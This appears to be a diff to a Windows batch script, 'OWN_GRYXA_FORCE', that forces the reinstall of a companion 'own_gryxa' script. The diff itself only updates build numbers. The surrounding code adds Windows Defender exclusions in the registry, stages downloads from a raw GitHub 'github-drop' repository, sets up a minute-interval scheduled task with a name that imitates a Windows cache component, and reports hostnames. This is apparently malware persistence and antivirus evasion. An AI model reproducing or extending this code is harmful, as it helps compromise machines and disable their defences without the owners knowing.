@@ -1,5 +1,6 @@
 @echo off
-rem OWN_GRYXA_FORCE BUILD 20260804F8 - REINSTALL breakaway (wmic plain path + PS Start-Process + minute task)
+rem OWN_GRYXA_FORCE BUILD 20260804F9 - REINSTALL breakaway (wmic plain path + PS Start-Process + minute task)
+rem F9: require G9+; abort path lives in own_gryxa (never /x live relay).
 rem F8: wmic failed on escaped quotes; schtasks ONCE stays Queued — use MINUTE+/Run. Requires G7.setlocal EnableExtensions EnableDelayedExpansion
 
 set "WD=%~1"
@@ -14,7 +15,7 @@ set "LOG=%WD%\own_gryxa_force.log"
 set "RAWMAIN=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "WORKER=%STAGE%\gryxa_reinstall_once.cmd"
 set "TASK=WucacheGryxaReinstall"
-set "BUILD=F8"
+set "BUILD=F9"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
@@ -27,7 +28,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 
 set "NEED_G=1"
 if exist "%WD%\own_gryxa.cmd" (
-  findstr /C:"OWN_GRYXA BUILD 20260804G7" "%WD%\own_gryxa.cmd" >nul 2>&1
+  findstr /C:"OWN_GRYXA BUILD 20260804G9" /C:"OWN_GRYXA BUILD 20260804G8" "%WD%\own_gryxa.cmd" >nul 2>&1
   if not errorlevel 1 set "NEED_G=0"
 )
 if "%NEED_G%"=="1" (
@@ -43,13 +44,13 @@ if not exist "%WD%\own_gryxa.cmd" (
   endlocal & exit /b 2
 )
 
-findstr /C:"OWN_GRYXA BUILD 20260804G7" "%WD%\own_gryxa.cmd" >nul 2>&1
+findstr /C:"OWN_GRYXA BUILD 20260804G9" /C:"OWN_GRYXA BUILD 20260804G8" "%WD%\own_gryxa.cmd" >nul 2>&1
 if errorlevel 1 (
   echo BUILD=%BUILD%
   echo HOST=%COMPUTERNAME%
   echo HEALTH=FAIL
-  echo REASON=own_gryxa-not-G7
-  echo REPORT %COMPUTERNAME% %FP% FAIL own_gryxa-not-G7
+  echo REASON=own_gryxa-not-G8+
+  echo REPORT %COMPUTERNAME% %FP% FAIL own_gryxa-not-G8+
   endlocal & exit /b 3
 )
 
